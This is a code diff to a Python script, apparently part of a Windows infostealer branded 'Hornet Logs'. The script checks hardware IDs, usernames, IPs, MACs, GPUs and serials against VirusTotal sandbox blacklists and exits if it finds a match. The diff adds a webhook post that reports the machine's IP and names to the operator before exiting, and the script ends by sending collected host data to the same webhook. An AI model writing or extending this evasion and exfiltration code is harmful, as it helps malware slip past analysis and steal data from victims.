@@ -9,6 +9,8 @@ import subprocess
 import winreg
 ip = requests.get('https://api.ipify.org').text
 
+webhook_url = "WEBHOOK_HERE"
+
 def getip():
     ip = "None"
     try:
@@ -74,85 +76,131 @@ hwprofileguidlist = requests.get(
 machineguidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt')
 hwguid = f'{get_hwguid()}'.replace('{', ' ').replace('}', ' ')
 
+vt_payload = {
+    "embeds": [
+        {
+            "title": "Virus Total Scan Detected",
+            "description": f"IP Address: {ip}",
+            "color": 16763904,
+            "fields": [
+                {
+                    "name": "Desktop Name",
+                    "value": desktop_name,
+                    "inline": False
+                },
+                {
+                    "name": "PC Name",
+                    "value": pc_name,
+                    "inline": False
+                }
+            ],
+            "thumbnail": {
+                "url": "https://yt3.googleusercontent.com/ytc/AOPolaTkLuq-p3dtzwLmhVr6cnOYh6PihW76KSu_QYMJ=s900-c-k-c0x00ffffff-no-rj"
+            }
+        }
+    ],
+    "username": "Hornet Logs",
+    "avatar_url": "https://yt3.googleusercontent.com/ytc/AOPolaTkLuq-p3dtzwLmhVr6cnOYh6PihW76KSu_QYMJ=s900-c-k-c0x00ffffff-no-rj"
+}
+
+
+def virus_total_send():
+    response = requests.post(webhook_url, json=vt_payload)
+
 def listcheck():
     try:
         if hwid in hwidlist.text:
+            virus_total_send()
             os._exit(1)
     except:
         os._exit(1)
 
     try:
         if serveruser in pcusernamelist.text:
+            virus_total_send()
             os._exit(1)
     except:
         os._exit(1)
 
     try:
         if pc_name in pcnamelist.text:
+            virus_total_send()
             os._exit(1)
     except:
         os._exit(1)
 
     try:
         if ip in iplist.text:
+            virus_total_send()
             os._exit(1)
     except:
         os._exit(1)
 
     try:
         if mac in maclist.text:
+            virus_total_send()
             os._exit(1)
     except:
         os._exit(1)
 
     try:
         if gpu in gpulist.text:
+            virus_total_send()
             os._exit(1)
     except:
         os._exit(1)
 
     try:
         if current_diskdrive_serial in diskdriveserial_list:
+            virus_total_send()
             os._exit(1)
     except:
         os._exit(1)
 
     try:
         if current_cpu_serial in cpuserial_list:
+            virus_total_send()
             os._exit(1)
     except:
         os._exit(1)
 
     try:
         if current_baseboard_manufacturer in baseboardmanufacturerlist:
+            virus_total_send()
             os._exit(1)
     except:
         os._exit(1)
 
     try:
         if current_bios_serial in bios_serial_list:
+            virus_total_send()
             os._exit(1)
     except:
         os._exit(1)
 
     try:
         if current_baseboard_serial in baseboardserial_list:
+            virus_total_send()
             os._exit(1)
     except:
         os._exit(1)
 
     try:
         if get_guid() in machineguidlist:
+            virus_total_send()
             os._exit(1)
     except:
         os._exit(1)
 
     try:
         if hwguid in hwprofileguidlist:
+            virus_total_send()
             os._exit(1)
     except:
         os._exit(1)
 listcheck()
+
+
 
 payload = {
     "embeds": [
@@ -221,5 +269,4 @@ payload = {
     "avatar_url": "https://cdn-icons-png.flaticon.com/512/4944/4944141.png"
 }
 
-webhook_url = "WEBHOOK_HERE"
 response = requests.post(webhook_url, json=payload)
